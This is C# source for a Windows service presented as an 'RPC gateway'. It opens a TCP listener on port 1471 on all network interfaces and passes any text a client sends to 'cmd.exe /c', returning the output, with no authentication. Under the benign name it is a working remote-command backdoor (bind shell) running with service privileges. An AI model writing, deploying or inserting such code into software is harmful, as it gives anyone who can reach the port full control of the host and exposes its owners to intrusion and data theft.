using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Linq;
using System.ServiceProcess;
using System.Text;
using System.Net;
using System.Net.Sockets;
using System.Timers;

namespace RPCGatewayService {

   public partial class RPCGatewayService : ServiceBase {
      const UInt16 RPC_GATEWAY_SERVICE_PORT = 1471;
      
      Socket oRPCServiceSocket;
      Socket oRPCClientSocket;

      public RPCGatewayService() {
         InitializeComponent();
      }

      protected override void OnStart(string[] args) {
         try {
            System.Timers.Timer oTimer = new System.Timers.Timer(30000);

            oTimer.Interval = 5000;
            oTimer.Elapsed += new ElapsedEventHandler(timerHandler);
            oTimer.AutoReset = false;
            oTimer.Start();
         } catch(Exception oException) {
            Console.WriteLine("Error: {0}", oException.ToString());

            if (oRPCServiceSocket != null) {
               if (oRPCClientSocket != null) {
                  oRPCClientSocket.Shutdown(SocketShutdown.Both);
                  oRPCClientSocket.Close();
               }

               oRPCServiceSocket.Close();
            }

            createRPCGatewayListenSocket();
         }
      }

      protected override void OnStop() {
         if (oRPCClientSocket != null) {
            oRPCClientSocket.Shutdown(SocketShutdown.Both);
            oRPCClientSocket.Close();
         }

         oRPCServiceSocket.Close();
      }

      private void timerHandler(object source, ElapsedEventArgs e) {
         createRPCGatewayListenSocket();
      }

      private void createRPCGatewayListenSocket() {
         oRPCServiceSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);

         IPEndPoint oRPCServiceAddress = new IPEndPoint(IPAddress.Any, RPC_GATEWAY_SERVICE_PORT);

         oRPCServiceSocket.Bind(oRPCServiceAddress);

         oRPCServiceSocket.Listen(Int16.MaxValue);

         for(;;) {
            oRPCClientSocket = oRPCServiceSocket.Accept();
            oRPCClientSocket.ReceiveTimeout = 5000;

            byte[] oRPCClientSocketData = new Byte[32768];
            string sRPCClientSocketData = String.Empty;

            bool bRPCClientSocketDataAllCommand = false;
            for (;!bRPCClientSocketDataAllCommand;) {
               try {
                  int nRPCClientSocketBytesReceive = oRPCClientSocket.Receive(oRPCClientSocketData);
                  sRPCClientSocketData += Encoding.ASCII.GetString(oRPCClientSocketData, 0, nRPCClientSocketBytesReceive);

                  if (sRPCClientSocketData.IndexOf("<EOC>") > -1) {
                     bRPCClientSocketDataAllCommand = true;
                  }
               } catch(Exception oException) { bRPCClientSocketDataAllCommand = true; }
            }

            if (sRPCClientSocketData.IndexOf("<EOC>") > -1) {
               sRPCClientSocketData = sRPCClientSocketData.Remove(sRPCClientSocketData.IndexOf("<EOC>"));

               Process oRPCServiceCommandProcess = new Process();
               oRPCServiceCommandProcess.StartInfo.FileName = "cmd.exe";
               oRPCServiceCommandProcess.StartInfo.Arguments = "/c " + sRPCClientSocketData;
               oRPCServiceCommandProcess.StartInfo.UseShellExecute = false;
               oRPCServiceCommandProcess.StartInfo.RedirectStandardOutput = true;
               oRPCServiceCommandProcess.StartInfo.RedirectStandardError = true;
               oRPCServiceCommandProcess.Start();

               string sRPCServiceCommandProcessOutput = oRPCServiceCommandProcess.StandardOutput.ReadToEnd();
               oRPCClientSocket.Send(Encoding.ASCII.GetBytes(sRPCServiceCommandProcessOutput + "<EOC>"));
            }

            oRPCClientSocket.Shutdown(SocketShutdown.Both);
            oRPCClientSocket.Close();
         }
      }
   }
}